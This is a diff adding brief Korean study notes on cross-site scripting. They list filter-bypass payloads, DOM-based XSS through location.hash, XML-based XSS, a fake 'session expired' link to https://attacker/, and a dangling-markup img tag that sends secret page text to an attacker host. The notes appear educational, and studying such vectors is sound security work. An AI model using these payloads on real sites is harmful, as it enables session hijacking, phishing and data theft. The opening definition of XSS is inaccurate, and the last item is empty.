@@ -1,0 +1,57 @@
+
+
+
+
+
+XSS란?
+  대충 우회란 뜻
+  
+1. url 단독
+  <a href="javascript:alert(1)">Link</a>
+2. 2개 이상의 인젝선 포인트
+  <div>`-alert(1)</script><script>`</div>
+  <div>`-alert(1)</script><script>`</div>
+3. 일부 문자열의 자동 삭제 or 치환
+  <svg o<script>nload=alert(1)>
+  ↓
+  <svg onload=alert(1)>
+4. 치환
+  <script>/&/-alert(1)</script>
+  ↓
+  <script>/&amp;/-alert(1)</script>
+5. Request값을 document.write()하는 경우를 제외한 DOM based XSS
+  <body>
+    <script>
+    hash=location.hash.slice(1);
+    document.body.innerHTML=decodeURIComponent(hash);
+    </script>
+  </body>
+  ↓
+  <script>
+  location.href=decodeURIComponent(location.hash.slice(1));
+  </script>
+6. XML에서의 XSS
+  <?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>
+  ↓
+  <?xml version="1.0"?><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
+7. https: 링크 만들기
+  <a href=https://attacker/>Session expired. Please login again.</a>
+8. img태그로 외부 Request할 때 비밀 정보 포함
+  <p><img src="https://attacker/?data=</p>
+  <p>This is a secret text.</p>
+  <p id="x">AAA</p>
+9. 여러개의 null문자 사용
+
+
+
+
+
+
+
+
+
+
+
+
+
+
